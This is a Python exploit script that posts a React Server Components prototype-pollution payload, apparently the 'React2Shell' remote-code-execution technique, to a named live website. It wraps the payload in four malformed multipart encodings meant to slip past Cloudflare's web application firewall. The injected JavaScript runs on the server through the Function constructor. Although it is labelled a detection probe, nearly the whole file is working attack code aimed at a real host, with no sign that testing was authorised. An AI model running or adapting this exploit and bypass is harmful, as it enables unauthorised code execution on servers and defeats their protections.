#!/usr/bin/env python3
"""WAFFLED-style multipart parser-confusion attempts against CF WAF for React2Shell.
Detection marker only. Reference: jedisct1/react2shell-exploit techniques."""
import ssl, json, time, random, string, http.cookiejar, urllib.request, urllib.error

CTX = ssl.create_default_context()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
BASE = "https://onlyfakeai.ru"
cj = http.cookiejar.CookieJar()
OPENER = urllib.request.build_opener(urllib.request.HTTPSHandler(context=CTX),
                                     urllib.request.HTTPCookieProcessor(cj))
MARK = "R2S_AUDIT_PROBE_"
PREFIX = ("var res=(typeof process!=='undefined'?process.version:'noproc');"
          "throw Object.assign(new Error('NEXT_REDIRECT'),{digest:'" + MARK + "'+res});")
P0 = ('{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
      '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":'
      + json.dumps(PREFIX) +
      ',"_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}')


def req(method, url, headers=None, body=None, timeout=30):
    h = {"User-Agent": UA, "Accept": "*/*"}
    if headers:
        h.update(headers)
    r = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with OPENER.open(r, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return 0, {}, str(e).encode()


def is_cf(b):
    return "Attention Required" in b.decode("utf-8", "ignore")[:3000]


def rnd(n=24):
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))


def send(tag, ctype, body):
    st, hd, b = req("POST", BASE + "/", headers={
        "Content-Type": ctype, "Next-Action": rnd(40), "Accept": "text/x-component",
        "Origin": BASE, "Referer": BASE + "/"}, body=body)
    t = b.decode("utf-8", "ignore")
    print(f"[{tag}] HTTP {st} cf={is_cf(b)} marker={MARK in t} len={len(b)}")
    if st != 403:
        print("   body:", t[:280].replace("\n", " "))
    if MARK in t:
        i = t.find(MARK)
        print("   >>> DIGEST:", t[i:i + 160].replace("\n", " "))
    time.sleep(2)


req("GET", BASE + "/")
time.sleep(1)

# W1: tab instead of space in Content-Disposition + duplicate name param + empty first part
bnd = "----B" + rnd(30)
body = (
    f"--{bnd}\r\nContent-Disposition:\tform-data;\tname=\"__empty__\"\r\n\r\n\r\n"
    f"--{bnd}\r\nContent-Disposition: form-data; name=\"0\"; name=\"junkzz\"\r\n\r\n{P0}\r\n"
    f"--{bnd}\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"\r\n"
    f"--{bnd}\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n[]\r\n"
    f"--{bnd}--\r\n").encode()
send("W1 tab+dupname+empty", f"multipart/form-data; boundary={bnd}", body)

# W2: duplicate Content-Disposition header lines (busboy likely last-wins, CF may first-wins)
bnd = "----B" + rnd(30)
body = (
    f"--{bnd}\r\nContent-Disposition: form-data; name=\"decoy\"\r\n"
    f"Content-Disposition: form-data; name=\"0\"\r\n\r\n{P0}\r\n"
    f"--{bnd}\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"\r\n"
    f"--{bnd}\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n[]\r\n"
    f"--{bnd}--\r\n").encode()
send("W2 dup-CDisposition", f"multipart/form-data; boundary={bnd}", body)

# W3: LF-only line endings in multipart body
bnd = "----B" + rnd(30)
body = (
    f"--{bnd}\nContent-Disposition: form-data; name=\"0\"\n\n{P0}\n"
    f"--{bnd}\nContent-Disposition: form-data; name=\"1\"\n\n\"$@0\"\n"
    f"--{bnd}\nContent-Disposition: form-data; name=\"2\"\n\n[]\n"
    f"--{bnd}--\n").encode()
send("W3 LF-only", f"multipart/form-data; boundary={bnd}", body)

# W4: extra CR (\r\r\n) in multipart body
bnd = "----B" + rnd(30)
E = "\r\r\n"
body = (
    f"--{bnd}{E}Content-Disposition: form-data; name=\"0\"{E}{E}{P0}{E}"
    f"--{bnd}{E}Content-Disposition: form-data; name=\"1\"{E}{E}\"$@0\"{E}"
    f"--{bnd}{E}Content-Disposition: form-data; name=\"2\"{E}{E}[]{E}"
    f"--{bnd}--{E}").encode()
send("W4 extra-CR", f"multipart/form-data; boundary={bnd}", body)
